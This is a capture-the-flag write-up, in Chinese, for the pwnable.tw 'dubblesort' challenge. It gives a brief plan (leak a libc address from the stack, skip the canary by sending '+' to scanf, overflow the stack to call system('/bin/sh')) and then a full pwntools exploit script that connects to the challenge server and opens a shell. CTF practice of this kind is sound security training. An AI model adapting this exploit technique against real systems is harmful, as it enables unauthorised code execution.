# poc

```
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
FORTIFY:  Enabled
```

> 泄漏`libc`地址 -> 绕过`canary` -> 栈溢出 -> `system('/bin/sh\x00')`

本地调试发现栈上残留`libc`地址，输入特定长度名字可以泄漏，根据相对偏移算出`libc`基址，当输入较大数字个数时可触发栈溢出，但`canary`需要特殊技巧绕过，`__isoc99_scanf("%u", &a)`可以通过输入`"+"`避免读入修改`canary`，剩余问题只需考虑计算栈地址，及排序后不影响`system`调用即可。

# exp

```python
from pwn import *

DEBUG = 0

context(arch = 'i386', os = 'linux', log_level = 'debug')

if DEBUG:
    p = process('./dubblesort.dms')
    e = ELF('./libc-2.23.so')
    gdb.attach(p)
else:
    p = remote('chall.pwnable.tw', 10101)
    e = ELF('./libc_32.so.6')

p.sendline('a' * 20 + 'abcd')
p.recvuntil('abcd')
libc_base = (u32(p.recv(4)) & 0xffffff00) - 0x1b0000
log.debug('%s => %d' % ('libc_base', libc_base))

system_addr = libc_base + e.symbols['system']
binsh_addr = libc_base + list(e.search('/bin/sh\x00'))[0]

p.sendline(str(35))

for i in range(24):
    p.sendline(str(i))

p.sendline('+')

for i in range(8):
    p.sendline(str(system_addr))

for i in range(2):
    p.sendline(str(binsh_addr))

p.interactive()
```
